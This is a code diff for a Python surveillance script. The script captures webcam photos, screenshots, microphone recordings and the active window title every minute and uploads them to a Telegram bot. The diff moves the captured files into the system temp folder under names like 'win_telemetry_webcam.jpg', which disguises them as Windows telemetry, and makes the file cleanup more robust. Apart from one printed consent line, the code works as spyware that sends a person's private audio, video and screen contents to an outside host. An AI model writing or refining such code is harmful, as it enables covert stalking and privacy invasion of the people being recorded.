@@ -7,6 +7,7 @@ import requests
 from dotenv import load_dotenv
 from PIL import ImageGrab
 import numpy as np
+import tempfile
 
 # Platform specific imports
 try:
@@ -28,6 +29,9 @@ INTERVAL = 60  # seconds between captures
 AUDIO_DURATION = 5  # seconds
 SAMPLE_RATE = 44100
 
+def get_temp_path(filename):
+    return os.path.join(tempfile.gettempdir(), filename)
+
 def get_active_window():
     if gw:
         try:
@@ -37,7 +41,7 @@ def get_active_window():
             return "Error retrieving window"
     return "Non-Windows Environment"
 
-def capture_webcam(filename="webcam.jpg"):
+def capture_webcam(filename):
     cam = cv2.VideoCapture(0)
     if not cam.isOpened():
         print("Could not open webcam")
@@ -52,7 +56,7 @@ def capture_webcam(filename="webcam.jpg"):
     cam.release()
     return ret
 
-def capture_screenshot(filename="screen.jpg"):
+def capture_screenshot(filename):
     try:
         screenshot = ImageGrab.grab()
         screenshot.save(filename)
@@ -61,7 +65,7 @@ def capture_screenshot(filename="screen.jpg"):
         print(f"Screenshot error: {e}")
         return False
 
-def capture_audio(filename="audio.wav"):
+def capture_audio(filename):
     try:
         print(f"Recording {AUDIO_DURATION}s of audio...")
         recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
@@ -72,7 +76,7 @@ def capture_audio(filename="audio.wav"):
         print(f"Audio error: {e}")
         return False
 
-def send_to_telegram(window_title):
+def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
     url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
     url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     
@@ -102,18 +106,18 @@ def send_to_telegram(window_title):
             print(f"NETWORK ERROR sending {data_type}: {e}")
 
     # Send Screenshot to TOPIC_SCREENSHOT
-    if os.path.exists("screen.jpg"):
-        with open("screen.jpg", "rb") as f:
+    if os.path.exists(screen_file):
+        with open(screen_file, "rb") as f:
             post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"SCREENSHOT\n{caption}", {"photo": f})
             
     # Send Webcam to TOPIC_WEBCAM
-    if os.path.exists("webcam.jpg"):
-        with open("webcam.jpg", "rb") as f:
+    if os.path.exists(webcam_file):
+        with open(webcam_file, "rb") as f:
             post_data(url_photo, "photo", TOPIC_WEBCAM, f"WEBCAM\n{caption}", {"photo": f})
 
     # Send Audio to TOPIC_AUDIO
-    if os.path.exists("audio.wav"):
-        with open("audio.wav", "rb") as f:
+    if os.path.exists(audio_file):
+        with open(audio_file, "rb") as f:
             post_data(url_doc, "document", TOPIC_AUDIO, f"AUDIO (Ambient)\n{caption}", {"document": f})
 
 def main():
@@ -132,23 +136,31 @@ def main():
     print("By running this, you consent to periodic screen, webcam, and audio capture.")
     print("--------------")
 
+    # Define temp file paths once
+    webcam_file = get_temp_path("win_telemetry_webcam.jpg")
+    screen_file = get_temp_path("win_telemetry_screen.jpg")
+    audio_file = get_temp_path("win_telemetry_audio.wav")
+
     try:
         while True:
             window_title = get_active_window()
             print(f"[{time.strftime('%H:%M:%S')}] Capturing data... (Active: {window_title})")
             
             # Capture all data points
-            capture_webcam()
-            capture_screenshot()
-            capture_audio()
+            capture_webcam(webcam_file)
+            capture_screenshot(screen_file)
+            capture_audio(audio_file)
             
             # Send to Telegram
-            send_to_telegram(window_title)
+            send_to_telegram(window_title, webcam_file, screen_file, audio_file)
             
             # Cleanup temp files
-            for f in ["webcam.jpg", "screen.jpg", "audio.wav"]:
+            for f in [webcam_file, screen_file, audio_file]:
                 if os.path.exists(f):
-                    os.remove(f)
+                    try:
+                        os.remove(f)
+                    except Exception as e:
+                        print(f"Cleanup error for {f}: {e}")
             
             print(f"Payload sent to respective topics. Sleeping for {INTERVAL}s...")
             time.sleep(INTERVAL)
